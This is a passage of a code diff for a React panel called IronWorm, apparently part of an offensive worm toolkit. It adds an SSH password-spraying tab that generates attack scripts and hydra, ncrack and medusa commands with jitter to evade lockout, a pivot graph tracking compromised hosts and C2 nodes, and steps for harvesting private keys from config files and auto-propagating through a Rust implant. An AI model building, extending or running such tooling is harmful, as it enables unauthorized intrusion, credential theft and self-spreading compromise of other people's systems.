+      let cur: PivotNode|undefined = n;
+      while (cur) {
+        chain.unshift(`${cur.user ?? "?"}@${cur.host}:${cur.port}`);
+        cur = pivotNodes.find(p=>p.id===cur?.via);
+      }
+      return chain.join(" → ");
+    });
+    return `# IronWorm Pivot Chains — ${new Date().toISOString()}\n\n${lines.join("\n")}`;
+  }, [pivotNodes]);
+
+  // ── SVG drag handlers ──────────────────────────────────────
+  const onSvgPointerDown = useCallback((e: React.PointerEvent<SVGSVGElement>) => {
+    const svg = svgRef.current;
+    if (!svg) return;
+    const pt = svg.createSVGPoint();
+    pt.x = e.clientX; pt.y = e.clientY;
+    const sp = pt.matrixTransform(svg.getScreenCTM()!.inverse());
+    const hit = pivotNodes.find(n => Math.hypot(n.x - sp.x, n.y - sp.y) < 24);
+    if (hit) {
+      dragRef.current = { id: hit.id, ox: sp.x - hit.x, oy: sp.y - hit.y };
+      setPivotSelected(hit);
+      (e.currentTarget as SVGSVGElement).setPointerCapture(e.pointerId);
+    } else {
+      setPivotSelected(null);
+    }
+  }, [pivotNodes]);
+
+  const onSvgPointerMove = useCallback((e: React.PointerEvent<SVGSVGElement>) => {
+    const drag = dragRef.current;
+    const svg = svgRef.current;
+    if (!drag || !svg) return;
+    const pt = svg.createSVGPoint();
+    pt.x = e.clientX; pt.y = e.clientY;
+    const sp = pt.matrixTransform(svg.getScreenCTM()!.inverse());
+    setPivotNodes(prev => prev.map(n =>
+      n.id === drag.id ? {...n, x: Math.max(36,Math.min(CANVAS_W-36,sp.x-drag.ox)), y: Math.max(36,Math.min(CANVAS_H-36,sp.y-drag.oy))} : n
+    ));
+  }, []);
+
+  const onSvgPointerUp = useCallback(() => { dragRef.current = null; }, []);
+
   const TABS_CONFIG: { id: IWTab; label: string; badge?: string }[] = [
-    { id:"scan",       label:"SCAN",      badge: scanResults.length > 0 ? String(scanResults.length) : undefined },
-    { id:"creds",      label:"CREDS",     badge: credMatches.length > 0 ? String(credMatches.length) : undefined },
-    { id:"propagate",  label:"PROPAGATE", badge: propResults.filter(r=>r.ok).length > 0 ? `${propResults.filter(r=>r.ok).length}✓` : undefined },
-    { id:"rustgen",    label:"RUSTGEN",   badge: genDone ? String(rustFiles.length)+"f" : undefined },
+    { id:"scan",      label:"SCAN",      badge: scanResults.length > 0 ? String(scanResults.length) : undefined },
+    { id:"creds",     label:"CREDS",     badge: credMatches.length > 0 ? String(credMatches.length) : undefined },
+    { id:"brute",     label:"BRUTE",     badge: bruteHits.length > 0 ? `${bruteHits.length}✓` : undefined },
+    { id:"pivot",     label:"PIVOT",     badge: pivotNodes.filter(n=>n.status==="compromised"||n.status==="ssh-open").length > 0 ? `${pivotNodes.filter(n=>n.status==="compromised"||n.status==="ssh-open").length}⬢` : undefined },
+    { id:"propagate", label:"PROPAGATE", badge: propResults.filter(r=>r.ok).length > 0 ? `${propResults.filter(r=>r.ok).length}✓` : undefined },
+    { id:"rustgen",   label:"RUSTGEN",   badge: genDone ? String(rustFiles.length)+"f" : undefined },
+    { id:"wormscan",  label:"WORMSCAN",  badge: wormResults.length > 0 ? String(wormResults.length) : undefined },
   ];
 
   return (
@@ -1346,6 +2558,593 @@ export default function IronWormPanel() {
                 </div>
                 <div className="text-[9px] text-zinc-600 uppercase tracking-widest mb-2">Generated Files</div>
                 {rustFiles.map((f,i) => <Artifact key={i} label={f.name} content={f.content} />)}
+              </div>
+            )}
+          </div>
+        </div>
+      )}
+
+      {/* ── BRUTE TAB ────────────────────────────────────────── */}
+      {tab === "brute" && (
+        <div className="flex flex-1 min-h-0 overflow-hidden">
+
+          {/* Config sidebar */}
+          <div className="w-60 border-r border-white/[.04] p-4 space-y-3 overflow-y-auto shrink-0 bg-black/20">
+            <div className="text-[9px] text-red-400 uppercase tracking-widest font-bold mb-2">SSH Smart Sprayer</div>
+
+            <div>
+              <label className="text-[9px] text-zinc-600 uppercase tracking-widest block mb-1">Target Hosts</label>
+              <textarea value={bruteHosts} onChange={e=>setBruteHosts(e.target.value)}
+                rows={4} placeholder={"192.168.1.0/24\n10.0.0.1\ntarget.example.com"}
+                className="w-full bg-black/60 border border-white/[.06] text-[10px] px-2 py-1.5 text-white focus:outline-none focus:border-red-900/60 placeholder-zinc-700 resize-none font-mono" />
+              <div className="text-[8px] text-zinc-700 mt-0.5">{bruteHosts.split(/[\n,]+/).filter(h=>h.trim()).length} hosts</div>
+              {bruteBlockedHosts.length > 0 && (
+                <div className="mt-1 border border-orange-900/60 bg-orange-950/20 px-2 py-1.5 space-y-0.5">
+                  <div className="text-[8px] font-bold text-orange-400">⚠ SELF-TARGET BLOCKED</div>
+                  {bruteBlockedHosts.map((b,i)=>(
+                    <div key={i} className="text-[8px] text-orange-300 font-mono truncate">{b.target} — {b.reason}</div>
+                  ))}
+                </div>
+              )}
+            </div>
+
+            <div>
+              <label className="text-[9px] text-zinc-600 uppercase tracking-widest block mb-1">Ports</label>
+              <input value={brutePorts} onChange={e=>setBrutePorts(e.target.value)} placeholder="22,2222"
+                className="w-full bg-black/60 border border-white/[.06] text-[10px] px-2 py-1.5 text-white focus:outline-none focus:border-red-900/60 placeholder-zinc-700" />
+            </div>
+
+            <div className="flex gap-2">
+              <div className="flex-1">
+                <label className="text-[9px] text-zinc-600 uppercase tracking-widest block mb-1">Max/User</label>
+                <input value={bruteMaxPerUser} onChange={e=>setBruteMaxPerUser(e.target.value)} type="number" min="1" max="20"
+                  className="w-full bg-black/60 border border-white/[.06] text-[10px] px-2 py-1.5 text-white focus:outline-none" />
+              </div>
+              <div className="flex-1">
+                <label className="text-[9px] text-zinc-600 uppercase tracking-widest block mb-1">Jitter ms</label>
+                <input value={bruteJitterMs} onChange={e=>setBruteJitterMs(e.target.value)} type="number" min="100" max="10000"
+                  className="w-full bg-black/60 border border-white/[.06] text-[10px] px-2 py-1.5 text-white focus:outline-none" />
+              </div>
+            </div>
+
+            <div>
+              <label className="text-[9px] text-zinc-600 uppercase tracking-widest block mb-1">Custom Users <span className="text-zinc-700">(override)</span></label>
+              <textarea value={bruteCustomUsers} onChange={e=>setBruteCustomUsers(e.target.value)}
+                rows={3} placeholder={"root\nadmin\nubuntu"}
+                className="w-full bg-black/60 border border-white/[.06] text-[10px] px-2 py-1.5 text-white focus:outline-none placeholder-zinc-700 resize-none font-mono" />
+            </div>
+
+            <div>
+              <label className="text-[9px] text-zinc-600 uppercase tracking-widest block mb-1">Custom Wordlist <span className="text-zinc-700">(override)</span></label>
+              <textarea value={bruteCustomPwds} onChange={e=>setBruteCustomPwds(e.target.value)}
+                rows={3} placeholder={"password\n123456\nadmin"}
+                className="w-full bg-black/60 border border-white/[.06] text-[10px] px-2 py-1.5 text-white focus:outline-none placeholder-zinc-700 resize-none font-mono" />
+            </div>
+
+            <div className="border-t border-white/[.04] pt-3 space-y-1.5">
+              {(["scripts","spray"] as const).map(m => (
+                <button key={m} onClick={()=>setBruteMode(m)}
+                  className={`block w-full text-left text-[10px] px-3 py-1.5 border mb-0.5 uppercase tracking-widest transition-all ${bruteMode===m?"border-red-800 bg-red-950/30 text-red-400":"border-zinc-800 text-zinc-600 hover:text-zinc-400"}`}>
+                  {m==="scripts"?"▤ Script Generator":"▶ Simulate Spray"}
+                </button>
+              ))}
+            </div>
+
+            {bruteMode === "spray" && (
+              <div className="space-y-1.5">
+                <button onClick={runBruteSimulation} disabled={bruteRunning || !bruteHosts.trim()}
+                  className="w-full py-2.5 text-[10px] font-bold uppercase tracking-widest border transition-all disabled:opacity-40 bg-red-950/20 border-red-800/50 text-red-400 hover:border-red-600">
+                  {bruteRunning ? <span className="flex items-center justify-center gap-2"><span className="w-3 h-3 border border-red-500 border-t-transparent rounded-full animate-spin"/>Spraying…</span> : "▶ Run Simulation"}
+                </button>
+                {bruteRunning && <button onClick={()=>{ bruteAbort.current?.abort(); setBruteRunning(false); }} className="w-full py-1.5 text-[10px] border border-zinc-800 text-zinc-500 uppercase">■ Stop</button>}
+              </div>
+            )}
+
+            <div className="border-t border-white/[.04] pt-2 text-[8px] text-zinc-700 space-y-1">
+              <div>Built-in: {bruteUsers().length} users · {brutePwds().length} passwords</div>
+              <div>Strategy: rotate users, lockout detect, jittered delay</div>
+              <div>Combine with SSH keys from CREDS tab for hybrid auth</div>
+            </div>
+          </div>
+
+          {/* Main content area */}
+          <div className="flex-1 flex flex-col min-h-0 overflow-hidden">
+
+            {bruteMode === "scripts" && (
+              <div className="flex-1 overflow-y-auto p-4 space-y-4">
+                <div className="text-[9px] text-zinc-600 uppercase tracking-widest mb-1">Generated Attack Scripts</div>
+
+                {/* Python Sprayer */}
+                <div className="border border-zinc-800 bg-black/40">
+                  <div className="flex items-center justify-between px-3 py-2 border-b border-zinc-800">
+                    <span className="text-[10px] font-bold text-blue-400">spray.py — Python Smart Sprayer</span>
+                    <div className="flex gap-2">
+                      <span className="text-[8px] text-zinc-600">{bruteUsers().length}u · {BRUTE_PASSWORDS.length}p · paramiko</span>
+                      <button onClick={()=>bruteCopy(genPythonScript(), "py")} className={`text-[9px] px-2 border transition-colors ${bruteCopied==="py"?"border-green-700 text-green-400":"border-zinc-700 text-zinc-500 hover:text-zinc-300"}`}>
+                        {bruteCopied==="py"?"✓":"CPY"}
+                      </button>
+                    </div>
+                  </div>
+                  <pre className="p-3 text-[9px] text-green-400 font-mono whitespace-pre-wrap leading-relaxed max-h-72 overflow-y-auto">{genPythonScript()}</pre>
+                </div>
+
+                {/* Tool Commands */}
+                <div className="border border-zinc-800 bg-black/40">
+                  <div className="px-3 py-2 border-b border-zinc-800 text-[10px] font-bold text-yellow-400">Tool Invocations</div>
+                  <div className="p-3 space-y-3">
+                    {(bruteHosts.split(/[\n,]+/).filter(h=>h.trim()).slice(0,3).length > 0
+                      ? bruteHosts.split(/[\n,]+/).filter(h=>h.trim()).slice(0,3)
+                      : ["TARGET"]
+                    ).map((host, i) => (
+                      <div key={i} className="space-y-2">
+                        <div className="text-[8px] text-zinc-500 uppercase">{host}</div>
+                        {brutePorts.split(",").map(p=>p.trim()).filter(Boolean).map(port => (
+                          <div key={port} className="space-y-1.5">
+                            <div className="flex items-center gap-2">
+                              <span className="text-[8px] text-purple-400 w-14 shrink-0">HYDRA</span>
+                              <code className="flex-1 text-[9px] text-zinc-300 font-mono break-all">{genHydraCmd(host, port)}</code>
+                              <button onClick={()=>bruteCopy(genHydraCmd(host, port), `h${i}${port}`)} className={`text-[8px] px-1.5 border shrink-0 ${bruteCopied===`h${i}${port}`?"border-green-700 text-green-400":"border-zinc-800 text-zinc-600 hover:text-zinc-300"}`}>{bruteCopied===`h${i}${port}`?"✓":"CPY"}</button>
+                            </div>
+                            <div className="flex items-center gap-2">
+                              <span className="text-[8px] text-cyan-400 w-14 shrink-0">NCRACK</span>
+                              <code className="flex-1 text-[9px] text-zinc-300 font-mono break-all">{genNcrackCmd(host, port)}</code>
+                              <button onClick={()=>bruteCopy(genNcrackCmd(host, port), `n${i}${port}`)} className={`text-[8px] px-1.5 border shrink-0 ${bruteCopied===`n${i}${port}`?"border-green-700 text-green-400":"border-zinc-800 text-zinc-600 hover:text-zinc-300"}`}>{bruteCopied===`n${i}${port}`?"✓":"CPY"}</button>
+                            </div>
+                            <div className="flex items-center gap-2">
+                              <span className="text-[8px] text-orange-400 w-14 shrink-0">MEDUSA</span>
+                              <code className="flex-1 text-[9px] text-zinc-300 font-mono break-all">{`medusa -h ${host} -p ${port} -U users.txt -P passwords.txt -M ssh -t 2 -r ${Math.ceil(parseInt(bruteJitterMs||"1200")/1000)}`}</code>
+                              <button onClick={()=>bruteCopy(`medusa -h ${host} -p ${port} -U users.txt -P passwords.txt -M ssh -t 2 -r ${Math.ceil(parseInt(bruteJitterMs||"1200")/1000)}`, `m${i}${port}`)} className={`text-[8px] px-1.5 border shrink-0 ${bruteCopied===`m${i}${port}`?"border-green-700 text-green-400":"border-zinc-800 text-zinc-600 hover:text-zinc-300"}`}>{bruteCopied===`m${i}${port}`?"✓":"CPY"}</button>
+                            </div>
+                          </div>
+                        ))}
+                      </div>
+                    ))}
+                  </div>
+                </div>
+
+                {/* Wordlists */}
+                <div className="grid grid-cols-2 gap-3">
+                  <div className="border border-zinc-800 bg-black/40">
+                    <div className="flex items-center justify-between px-3 py-1.5 border-b border-zinc-800">
+                      <span className="text-[9px] font-bold text-zinc-400">users.txt ({bruteUsers().length})</span>
+                      <button onClick={()=>bruteCopy(bruteUsers().join("\n"), "users")} className={`text-[8px] px-1.5 border ${bruteCopied==="users"?"border-green-700 text-green-400":"border-zinc-800 text-zinc-600 hover:text-zinc-300"}`}>{bruteCopied==="users"?"✓":"CPY"}</button>
+                    </div>
+                    <div className="p-2 max-h-40 overflow-y-auto">
+                      {bruteUsers().map((u,i)=><div key={i} className="text-[9px] text-zinc-400 font-mono">{u}</div>)}
+                    </div>
+                  </div>
+                  <div className="border border-zinc-800 bg-black/40">
+                    <div className="flex items-center justify-between px-3 py-1.5 border-b border-zinc-800">
+                      <span className="text-[9px] font-bold text-zinc-400">passwords.txt ({brutePwds().length})</span>
+                      <button onClick={()=>bruteCopy(brutePwds().join("\n"), "pwds")} className={`text-[8px] px-1.5 border ${bruteCopied==="pwds"?"border-green-700 text-green-400":"border-zinc-800 text-zinc-600 hover:text-zinc-300"}`}>{bruteCopied==="pwds"?"✓":"CPY"}</button>
+                    </div>
+                    <div className="p-2 max-h-40 overflow-y-auto">
+                      {brutePwds().map((p,i)=><div key={i} className="text-[9px] text-zinc-400 font-mono">{p.length===0?"(empty)":p}</div>)}
+                    </div>
+                  </div>
+                </div>
+
+                {/* Key reuse note */}
+                <div className="border border-yellow-900/40 bg-yellow-950/10 px-3 py-2.5">
+                  <div className="text-[9px] font-bold text-yellow-400 mb-1">Hybrid Key + Password Attack</div>
+                  <div className="text-[9px] text-zinc-500 space-y-1">
+                    <div>1. Scan creds in CREDS tab — harvest private keys from env dumps, config files</div>
+                    <div>2. Export found keys → <code className="text-yellow-300">~/.ssh/id_rsa_target</code></div>
+                    <div>3. Try key-based first: <code className="text-yellow-300">ssh -i id_rsa_target user@host</code></div>
+                    <div>4. Fall back to password spray if keys fail</div>
+                    <div>5. Auto-propagate with <code className="text-yellow-300">ssh_brute::spray_neighbors()</code> in Rust implant</div>
+                  </div>
+                </div>
+              </div>
+            )}
+
+            {bruteMode === "spray" && (
+              <div className="flex flex-1 min-h-0 overflow-hidden">
+                <div ref={bruteLogRef} className="flex-1 bg-black/80 px-4 py-3 overflow-y-auto font-mono text-[9px] leading-relaxed">
+                  {bruteLog.length === 0 && !bruteRunning && (
+                    <div className="flex flex-col items-center justify-center h-full text-zinc-700 gap-2">
+                      <span className="text-4xl opacity-20">🔑</span>
+                      <p className="text-[10px] uppercase tracking-widest">Configure hosts and press Run Simulation</p>
+                      <p className="text-[9px] text-zinc-800 text-center mt-1 max-w-xs">Frontend simulates spray logic and timing.<br/>Use generated scripts for actual execution.</p>
+                    </div>
+                  )}
+                  {bruteLog.map((l,i) => (
+                    <div key={i} className={
+                      l.includes("[+]")||l.includes("HIT") ? "text-green-400" :
+                      l.includes("FOUND")                  ? "text-red-400 font-bold" :
+                      l.includes("⚠")                     ? "text-yellow-400" :
+                      l.includes("▶")||l.includes("■")    ? "text-red-400" :
+                      l.includes("✗")                      ? "text-zinc-700" :
+                      "text-zinc-500"
+                    }>{l}</div>
+                  ))}
+                  {bruteRunning && <div className="text-red-700 animate-pulse mt-1">● spraying…</div>}
+                </div>
+                {bruteHits.length > 0 && (
+                  <div className="w-72 border-l border-white/[.04] p-3 overflow-y-auto shrink-0">
+                    <div className="text-[9px] text-green-400 uppercase tracking-widest mb-2">{bruteHits.length} hits</div>
+                    {bruteHits.map((h,i)=>(
+                      <div key={i} className="border border-green-900/50 bg-green-950/20 p-2 mb-2">
+                        <div className="text-[10px] font-bold text-green-400">{h.host}:{h.port}</div>
+                        <div className="text-[9px] text-zinc-300 font-mono mt-0.5">{h.user}:{h.pass}</div>
+                        <div className="text-[8px] text-zinc-700 mt-0.5">{h.ts}</div>
+                      </div>
+                    ))}
+                  </div>
+                )}
+              </div>
+            )}
+          </div>
+        </div>
+      )}
+
+      {/* ── PIVOT TAB ────────────────────────────────────────── */}
+      {tab === "pivot" && (
+        <div className="flex flex-1 min-h-0 overflow-hidden">
+
+          {/* Left: SVG canvas */}
+          <div className="flex-1 relative min-w-0 overflow-hidden bg-black/60">
+            {/* Toolbar */}
+            <div className="absolute top-0 left-0 right-0 z-10 flex items-center gap-2 px-3 py-1.5 bg-black/80 border-b border-white/[.04] text-[9px]">
+              <button onClick={() => setPivotSimOn(v=>!v)}
+                className={`px-3 py-1 border uppercase tracking-widest font-bold transition-all ${pivotSimOn?"border-red-700 text-red-400 bg-red-950/20":"border-zinc-700 text-zinc-400 hover:border-zinc-500"}`}>
+                {pivotSimOn ? "■ Pause" : "▶ Simulate"}
+              </button>
+              <button onClick={pivotSimulateDiscover} className="px-3 py-1 border border-zinc-800 text-zinc-500 hover:text-zinc-300 uppercase tracking-widest">
+                ⎋ Discover
+              </button>
+              <button onClick={pivotImportBrute} disabled={bruteHits.length===0}
+                className="px-3 py-1 border border-zinc-800 text-zinc-500 hover:text-zinc-300 uppercase tracking-widest disabled:opacity-30">
+                ↑ Import Brute ({bruteHits.length})
+              </button>
+              <button onClick={pivotAddC2} disabled={!cbHost}
+                className="px-3 py-1 border border-zinc-800 text-zinc-500 hover:text-zinc-300 uppercase tracking-widest disabled:opacity-30">
+                C2 Node
+              </button>
+              <div className="flex items-center gap-1 ml-1">
+                <input value={pivotAddHost} onChange={e=>{setPivotAddHost(e.target.value);setPivotSelfWarn(selfWarning(e.target.value));}}
+                  placeholder="host/IP" onKeyDown={e=>{ if(e.key==="Enter"&&pivotAddHost.trim()){ pivotAddNode(pivotAddHost.trim(),parseInt(pivotAddPort)||22,"unknown"); setPivotAddHost(""); }}}
+                  className="bg-black/60 border border-white/[.06] text-[9px] px-2 py-1 text-white w-28 focus:outline-none focus:border-zinc-600 placeholder-zinc-700" />
+                <input value={pivotAddPort} onChange={e=>setPivotAddPort(e.target.value)} placeholder="22"
+                  className="bg-black/60 border border-white/[.06] text-[9px] px-2 py-1 text-white w-12 focus:outline-none" />
+                <button onClick={()=>{ if(pivotAddHost.trim()){ pivotAddNode(pivotAddHost.trim(),parseInt(pivotAddPort)||22,"unknown"); setPivotAddHost(""); }}}
+                  className="px-2 py-1 border border-zinc-700 text-zinc-400 hover:text-zinc-200 text-[9px]">+</button>
+              </div>
+              <button onClick={()=>{ setPivotNodes([]); setPivotEdges([]); setPivotSelected(null); pivotVel.current.clear(); }}
+                className="ml-auto text-[9px] text-zinc-700 hover:text-red-400 uppercase tracking-widest">
+                Clear
+              </button>
+              <span className="text-zinc-700">{pivotNodes.length}n · {pivotEdges.length}e</span>
+            </div>
+
+            {/* SelfGuard warning */}
+            {pivotSelfWarn && (
+              <div className="absolute top-8 left-0 right-0 z-20 mx-3 mt-1 border border-orange-900/60 bg-orange-950/20 px-3 py-1.5 flex items-center gap-2">
+                <span className="text-orange-400 font-bold text-[9px]">⚠ SELF-TARGET BLOCKED</span>
+                <span className="text-orange-300 text-[9px]">{pivotSelfWarn}</span>
+                <button onClick={()=>setPivotSelfWarn(null)} className="ml-auto text-zinc-600 hover:text-zinc-300 text-[10px]">✕</button>
+              </div>
+            )}
+
+            {/* Empty state */}
+            {pivotNodes.length === 0 && (
+              <div className="absolute inset-0 flex flex-col items-center justify-center text-zinc-700 gap-3 pt-10">
+                <div className="text-5xl opacity-10">⬡</div>
+                <div className="text-[10px] uppercase tracking-widest">Pivot topology is empty</div>
+                <div className="text-[9px] text-zinc-800 text-center max-w-xs">
+                  Import from BRUTE tab after a spray,<br/>add nodes manually, or click Discover
+                </div>
+              </div>
+            )}
+
+            {/* SVG canvas */}
+            <svg
+              ref={svgRef}
+              viewBox={`0 0 ${CANVAS_W} ${CANVAS_H}`}
+              className="w-full h-full pt-8 cursor-default"
+              onPointerDown={onSvgPointerDown}
+              onPointerMove={onSvgPointerMove}
+              onPointerUp={onSvgPointerUp}
+              style={{touchAction:"none"}}
+            >
+              <defs>
+                <marker id="arrowGray"  markerWidth="7" markerHeight="7" refX="6" refY="3.5" orient="auto"><polygon points="0 0, 7 3.5, 0 7" fill="#52525b"/></marker>
+                <marker id="arrowBlue"  markerWidth="7" markerHeight="7" refX="6" refY="3.5" orient="auto"><polygon points="0 0, 7 3.5, 0 7" fill="#3b82f6"/></marker>
+                <marker id="arrowYellow"markerWidth="7" markerHeight="7" refX="6" refY="3.5" orient="auto"><polygon points="0 0, 7 3.5, 0 7" fill="#eab308"/></marker>
+                <marker id="arrowRed"   markerWidth="7" markerHeight="7" refX="6" refY="3.5" orient="auto"><polygon points="0 0, 7 3.5, 0 7" fill="#ef4444"/></marker>
+                <filter id="glowRed"><feGaussianBlur stdDeviation="3" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+                <filter id="glowGreen"><feGaussianBlur stdDeviation="3" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+              </defs>
+
+              {/* Edges */}
+              {pivotEdges.map((e, i) => {
+                const a = pivotNodes.find(n=>n.id===e.from);
+                const b = pivotNodes.find(n=>n.id===e.to);
+                if (!a || !b) return null;
+                const edgeColor = e.type==="ssh"?"#ef4444":e.type==="chain"?"#f97316":e.type==="tcp"?"#3b82f6":"#3f3f46";
+                const markerId = e.type==="ssh"?"arrowRed":e.type==="tcp"?"arrowBlue":e.type==="chain"?"arrowRed":"arrowGray";
+                const mx = (a.x+b.x)/2, my = (a.y+b.y)/2;
+                return (
+                  <g key={i}>
+                    <line x1={a.x} y1={a.y} x2={b.x} y2={b.y}
+                      stroke={edgeColor} strokeWidth={e.type==="ssh"?1.5:1}
+                      strokeDasharray={e.type==="arp"?"4 4":undefined}
+                      strokeOpacity={0.6}
+                      markerEnd={`url(#${markerId})`}/>
+                    {e.label && (
+                      <text x={mx} y={my-4} textAnchor="middle" fill={edgeColor} fontSize={8} opacity={0.8}>{e.label}</text>
+                    )}
+                  </g>
+                );
+              })}
+
+              {/* Nodes */}
+              {pivotNodes.map(n => {
+                const col    = pivotColor[n.status] ?? "#52525b";
+                const isComp = n.status==="compromised"||n.status==="c2";
+                const isSel  = pivotSelected?.id === n.id;
+                const r      = n.status==="c2"||n.status==="attacker" ? 22 : 18;
+                return (
+                  <g key={n.id} style={{cursor:"grab"}}>
+                    {/* Glow ring for compromised/c2 */}
+                    {isComp && (
+                      <circle cx={n.x} cy={n.y} r={r+8} fill="none"
+                        stroke={col} strokeWidth={1} strokeOpacity={0.25 + 0.15*Math.sin(pivotTick*0.15)}/>
+                    )}
+                    {/* Selection ring */}
+                    {isSel && (
+                      <circle cx={n.x} cy={n.y} r={r+5} fill="none" stroke="#fff" strokeWidth={1} strokeOpacity={0.4}/>
+                    )}
+                    {/* Node body */}
+                    <circle cx={n.x} cy={n.y} r={r}
+                      fill={col} fillOpacity={0.18}
+                      stroke={col} strokeWidth={isSel?2:1.5}
+                      filter={isComp?"url(#glowRed)":undefined}/>
+                    {/* Node icon text */}
+                    <text x={n.x} y={n.y+1} textAnchor="middle" dominantBaseline="middle"
+                      fill={col} fontSize={n.status==="attacker"||n.status==="c2"?13:10} fontFamily="monospace" fontWeight="bold">
+                      {n.status==="attacker"?"▲":n.status==="c2"?"⊕":n.status==="compromised"?"✕":n.status==="ssh-open"?"⚿":n.status==="reachable"?"●":"○"}
+                    </text>
+                    {/* Hop badge */}
+                    {n.hops > 0 && n.status!=="attacker" && (
+                      <g>
+                        <circle cx={n.x+r-2} cy={n.y-r+2} r={7} fill="#18181b" stroke={col} strokeWidth={1}/>
+                        <text x={n.x+r-2} y={n.y-r+2} textAnchor="middle" dominantBaseline="middle" fill={col} fontSize={7}>{n.hops}</text>
+                      </g>
+                    )}
+                    {/* Host label */}
+                    <text x={n.x} y={n.y+r+10} textAnchor="middle" fill="#a1a1aa" fontSize={8} fontFamily="monospace">
+                      {n.host.length > 15 ? n.host.slice(0,14)+"…" : n.host}
+                    </text>
+                    <text x={n.x} y={n.y+r+19} textAnchor="middle" fill={col} fontSize={7} fontFamily="monospace">
+                      {pivotLabel[n.status]}
+                    </text>
+                  </g>
+                );
+              })}
+            </svg>
+
+            {/* Legend */}
+            <div className="absolute bottom-2 left-3 flex items-center gap-3 text-[8px] font-mono">
+              {(["attacker","reachable","ssh-open","compromised","c2","unknown"] as const).map(s => (
+                <div key={s} className="flex items-center gap-1">
+                  <div className="w-2 h-2 rounded-full" style={{background: pivotColor[s]}}/>
+                  <span style={{color: pivotColor[s]}}>{pivotLabel[s]}</span>
+                </div>
+              ))}
+              <span className="text-zinc-800 ml-2">edge: <span className="text-zinc-600">– – ARP</span> <span className="text-blue-700">— TCP</span> <span className="text-red-700">— SSH</span></span>
+            </div>
+          </div>
+
+          {/* Right: controls + selected node detail */}
+          <div className="w-64 border-l border-white/[.04] flex flex-col overflow-hidden shrink-0 bg-black/20">
+
+            {/* Node detail */}
+            {pivotSelected ? (
+              <div className="p-3 border-b border-white/[.04] space-y-2">
+                <div className="flex items-center justify-between">
+                  <span className="text-[9px] text-zinc-500 uppercase tracking-widest">Selected Node</span>
+                  <button onClick={()=>setPivotSelected(null)} className="text-zinc-700 hover:text-zinc-400 text-[10px]">✕</button>
+                </div>
+                <div className="space-y-1">
+                  <div className="flex gap-2">
+                    <span className="text-[8px] text-zinc-600 w-10">HOST</span>
+                    <span className="text-[9px] text-white font-mono">{pivotSelected.host}</span>
+                  </div>
+                  <div className="flex gap-2">
+                    <span className="text-[8px] text-zinc-600 w-10">PORT</span>
+                    <span className="text-[9px] text-zinc-300 font-mono">{pivotSelected.port}</span>
+                  </div>
+                  <div className="flex gap-2">
+                    <span className="text-[8px] text-zinc-600 w-10">STATUS</span>
+                    <span className="text-[9px] font-bold" style={{color:pivotColor[pivotSelected.status]}}>{pivotLabel[pivotSelected.status]}</span>
+                  </div>
+                  <div className="flex gap-2">
+                    <span className="text-[8px] text-zinc-600 w-10">HOPS</span>
+                    <span className="text-[9px] text-zinc-300">{pivotSelected.hops}</span>
+                  </div>
+                  {pivotSelected.user && <div className="flex gap-2">
+                    <span className="text-[8px] text-zinc-600 w-10">USER</span>
+                    <span className="text-[9px] text-green-400 font-mono">{pivotSelected.user}</span>
+                  </div>}
+                  {pivotSelected.pass && <div className="flex gap-2">
+                    <span className="text-[8px] text-zinc-600 w-10">PASS</span>
+                    <span className="text-[9px] text-green-300 font-mono">{pivotSelected.pass}</span>
+                  </div>}
+                </div>
+
+                {/* Upgrade / action buttons */}
+                <div className="space-y-1 pt-1 border-t border-white/[.04]">
+                  <div className="text-[8px] text-zinc-600 uppercase tracking-widest mb-1">Actions</div>
+                  {pivotSelected.status==="unknown"&&(
+                    <button onClick={()=>pivotUpgradeNode(pivotSelected.id,"reachable")}
+                      className="w-full text-left text-[9px] px-2 py-1 border border-zinc-800 text-zinc-500 hover:text-blue-400 hover:border-blue-900 uppercase tracking-widest">Mark Reachable</button>
+                  )}
+                  {(pivotSelected.status==="unknown"||pivotSelected.status==="reachable")&&(
+                    <button onClick={()=>pivotUpgradeNode(pivotSelected.id,"ssh-open")}
+                      className="w-full text-left text-[9px] px-2 py-1 border border-zinc-800 text-zinc-500 hover:text-yellow-400 hover:border-yellow-900 uppercase tracking-widest">Mark SSH Open</button>
+                  )}
+                  {(pivotSelected.status==="ssh-open"||pivotSelected.status==="reachable")&&(
+                    <button onClick={()=>{ setPivotSelected(null); setTab("brute"); setBruteHosts(pivotSelected.host); }}
+                      className="w-full text-left text-[9px] px-2 py-1 border border-yellow-900/50 text-yellow-600 hover:text-yellow-400 uppercase tracking-widest">→ Spray in BRUTE</button>
+                  )}
+                  {pivotSelected.status!=="compromised"&&pivotSelected.status!=="attacker"&&(
+                    <button onClick={()=>pivotUpgradeNode(pivotSelected.id,"compromised")}
+                      className="w-full text-left text-[9px] px-2 py-1 border border-red-900/50 text-red-600 hover:text-red-400 uppercase tracking-widest">Mark Compromised</button>
+                  )}
+                  {pivotSelected.status==="compromised"&&(
+                    <button onClick={()=>{ pivotSimulateDiscover(); }}
+                      className="w-full text-left text-[9px] px-2 py-1 border border-red-800/60 bg-red-950/20 text-red-400 hover:border-red-600 uppercase tracking-widest">⎋ Discover Neighbors</button>
+                  )}
+                  <button onClick={()=>setPivotNodes(p=>p.filter(n=>n.id!==pivotSelected.id))}
+                    className="w-full text-left text-[9px] px-2 py-1 border border-zinc-900 text-zinc-700 hover:text-red-500 uppercase tracking-widest">Remove Node</button>
+                </div>
+
+                {/* SSH command */}
+                {pivotSelected.user && (
+                  <div className="pt-1 border-t border-white/[.04]">
+                    <div className="text-[8px] text-zinc-600 mb-1">SSH Command</div>
+                    <code className="block text-[8px] text-green-400 font-mono bg-black/60 px-2 py-1 break-all">
+                      ssh {pivotSelected.user}@{pivotSelected.host} -p {pivotSelected.port}
+                    </code>
+                    <button onClick={()=>navigator.clipboard.writeText(`ssh ${pivotSelected.user}@${pivotSelected.host} -p ${pivotSelected.port}`).catch(()=>{})}
+                      className="mt-1 text-[8px] px-2 py-0.5 border border-zinc-800 text-zinc-600 hover:text-zinc-300 uppercase">Copy</button>
+                  </div>
+                )}
+              </div>
+            ) : (
+              <div className="p-3 border-b border-white/[.04]">
+                <div className="text-[9px] text-zinc-600 text-center py-4">Click a node to inspect</div>
+              </div>
+            )}
+
+            {/* Stats */}
+            <div className="p-3 border-b border-white/[.04] space-y-1">
+              <div className="text-[9px] text-zinc-600 uppercase tracking-widest mb-1.5">Graph Stats</div>
+              {(["unknown","reachable","ssh-open","compromised","c2","attacker"] as const).map(s => {
